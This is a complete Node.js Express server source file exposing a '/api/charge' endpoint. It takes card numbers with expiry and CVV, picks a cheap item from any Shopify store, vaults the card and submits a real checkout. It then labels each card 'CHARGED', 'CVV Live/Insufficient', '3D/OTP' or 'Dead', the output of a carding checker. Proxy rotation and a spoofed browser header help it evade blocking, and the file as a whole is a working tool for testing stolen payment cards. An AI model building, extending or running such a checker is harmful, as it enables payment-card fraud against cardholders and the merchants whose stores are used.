const express = require('express');
const fetch = require('node-fetch');
const { HttpsProxyAgent } = require('https-proxy-agent');
const SocksProxyAgent = require('socks-proxy-agent');
const app = express();

app.use(express.json());

app.get('/', (req, res) => {
    res.send({ status: "Shopify Authentic Gateway Engine Active" });
});

// Luhn Algorithm to ensure card number format validity
function isValidLuhn(cardNumber) {
    const cleanNum = cardNumber.replace(/\D/g, '');
    if (cleanNum.length < 13 || cleanNum.length > 19) return false;
    let sum = 0;
    let shouldDouble = false;
    for (let i = cleanNum.length - 1; i >= 0; i--) {
        let digit = parseInt(cleanNum.charAt(i), 10);
        if (shouldDouble) {
            digit *= 2;
            if (digit > 9) digit -= 9;
        }
        sum += digit;
        shouldDouble = !shouldDouble;
    }
    return (sum % 10) === 0;
}

app.post('/api/charge', async (req, res) => {
    const { card, site, proxy } = req.body;

    if (!card || !site) {
        return res.json({ status: "Dead", message: "MISSING_DATA", gateway: "Shopify Payments", price: "-", site: site || "N/A" });
    }

    try {
        const cleanSite = site.replace(/\/$/, '');
        const [ccNo, expMonth, expYear, cvv] = card.split('|');

        // Instant rejection for mathematically invalid cards
        if (!isValidLuhn(ccNo)) {
            return res.json({ status: "Dead", message: "INVALID_CARD_NUMBER (LUHN_FAILED)", gateway: "Shopify Payments", price: "-", site: cleanSite });
        }

        let agent = null;
        if (proxy) {
            let pClean = proxy.trim();
            let proxyUrl = pClean;
            if (!pClean.includes('://')) {
                const parts = pClean.split(':');
                if (parts.length === 4) {
                    proxyUrl = `http://${parts[2]}:${parts[3]}@${parts[0]}:${parts[1]}`;
                } else if (parts.length === 2) {
                    proxyUrl = `http://${parts[0]}:${parts[1]}`;
                } else {
                    proxyUrl = `http://${pClean}`;
                }
            }
            agent = proxyUrl.startsWith('socks') ? new SocksProxyAgent(proxyUrl) : new HttpsProxyAgent(proxyUrl);
        }

        let cookies = '';
        const customFetch = async (url, options = {}) => {
            options.headers = options.headers || {};
            if (cookies) options.headers['Cookie'] = cookies;
            if (agent) options.agent = agent;
            options.timeout = 15000;
            const response = await fetch(url, options);
            const setCookie = response.headers.raw()['set-cookie'];
            if (setCookie) {
                cookies = setCookie.map(c => c.split(';')[0]).join('; ');
            }
            return response;
        };

        const baseHeaders = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        };

        // 1. Fetch store products under $10
        const prodRes = await customFetch(`${cleanSite}/products.json?limit=40`, { headers: baseHeaders });
        if (!prodRes.ok) return res.json({ status: "Dead", message: "STORE_OFFLINE_OR_BLOCKED", gateway: "Shopify Payments", price: "-", site: cleanSite });

        const prodData = await prodRes.json();
        if (!prodData.products || prodData.products.length === 0) {
            return res.json({ status: "Dead", message: "NO_PRODUCTS_FOUND", gateway: "Shopify Payments", price: "-", site: cleanSite });
        }

        let selectedVariantId = null;
        let selectedPrice = 5.00;

        for (const prod of prodData.products) {
            for (const v of prod.variants) {
                const p = parseFloat(v.price);
                if (p > 0 && p <= 10.00 && v.available) {
                    selectedVariantId = v.id;
                    selectedPrice = p;
                    break;
                }
            }
            if (selectedVariantId) break;
        }

        if (!selectedVariantId) {
            return res.json({ status: "Dead", message: "NO_PRODUCT_UNDER_10", gateway: "Shopify Payments", price: ">$10", site: cleanSite });
        }

        const formattedPrice = `$${selectedPrice.toFixed(2)}`;

        // 2. Add product to cart session
        const cartAdd = await customFetch(`${cleanSite}/cart/add.js`, {
            method: 'POST',
            headers: { ...baseHeaders, 'Content-Type': 'application/json' },
            body: JSON.stringify({ id: selectedVariantId, quantity: 1 })
        });

        if (!cartAdd.ok) return res.json({ status: "Dead", message: "CART_ADD_FAILED", gateway: "Shopify Payments", price: formattedPrice, site: cleanSite });

        // 3. Vault card via Shopify Deposit API
        const vaultRes = await fetch('https://elb.deposit.shopifycs.com/sessions', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'Accept': 'application/json', 'User-Agent': baseHeaders['User-Agent'] },
            body: JSON.stringify({
                credit_card: { number: ccNo, month: expMonth, year: expYear, name: "Valued Customer", verification_value: cvv }
            }),
            timeout: 10000
        });
        const vaultData = await vaultRes.json();

        if (!vaultData.id) {
            return res.json({ status: "Dead", message: "CARD_VAULT_DECLINED", gateway: "Shopify Payments", price: formattedPrice, site: cleanSite });
        }

        // 4. Submit checkout payload to test real payment gateway transaction
        const paymentPayload = {
            step: 'payment',
            s: vaultData.id,
            checkout: {
                credit_card: { vault_id: vaultData.id }
            }
        };

        const paySubmit = await customFetch(`${cleanSite}/checkout`, {
            method: 'POST',
            headers: { ...baseHeaders, 'Content-Type': 'application/json', 'X-Requested-With': 'XMLHttpRequest' },
            body: JSON.stringify(paymentPayload)
        });

        const respText = await paySubmit.text();
        const finalUrl = paySubmit.url;

        // 5. Extract Authentic Response Text directly from Shopify's Response HTML/JSON
        let authenticError = "DECLINED_BY_PROCESSOR";
        
        try {
            if (respText.includes('notice__content') || respText.includes('error-message') || respText.includes('field-error')) {
                const matches = respText.match(/class="notice__content"[^>]*>([\s\S]*?)<\/p>/i) || 
                                respText.match(/class="error-message"[^>]*>([\s\S]*?)<\//i) ||
                                respText.match(/class="field__message[^"]*"[^>]*>([\s\S]*?)<\//i);
                if (matches && matches[1]) {
                    authenticError = matches[1].replace(/<[^>]*>?/gm, '').trim();
                }
            }
        } catch (e) {}

        const lowerResp = respText.toLowerCase();
        
        const isRealSuccess = (finalUrl.includes('thank_you') || respText.includes('thank_you')) && 
                              (respText.includes('order_number') || respText.includes('checkout_token'));

        if (isRealSuccess) {
            return res.json({ status: "CHARGED", message: "ORDER_PLACED_SUCCESSFULLY", gateway: "Shopify Payments", price: formattedPrice, site: cleanSite });
        } else if (lowerResp.includes('insufficient_funds') || lowerResp.includes('insufficient funds')) {
            return res.json({ status: "CVV Live/Insufficient", message: "INSUFFICIENT_FUNDS", gateway: "Shopify Payments", price: formattedPrice, site: cleanSite });
        } else if (lowerResp.includes('three_d_secure') || lowerResp.includes('challenge') || lowerResp.includes('3d secure') || lowerResp.includes('authenticate')) {
            return res.json({ status: "3D/OTP", message: "CHALLENGE_REQUIRED_3DS", gateway: "Shopify Payments", price: formattedPrice, site: cleanSite });
        } else if (lowerResp.includes('incorrect_cvc') || lowerResp.includes('security code') || lowerResp.includes('cvv')) {
            return res.json({ status: "CVV Live/Insufficient", message: "CCN_LIVE_INCORRECT_CVC", gateway: "Shopify Payments", price: formattedPrice, site: cleanSite });
        } else {
            return res.json({ status: "Dead", message: authenticError, gateway: "Shopify Payments", price: formattedPrice, site: cleanSite });
        }

    } catch (err) {
        return res.json({ status: "Dead", message: `GATEWAY_TIMEOUT_${err.message}`, gateway: "Shopify Payments", price: "-", site: site || "N/A" });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`API running on port ${PORT}`));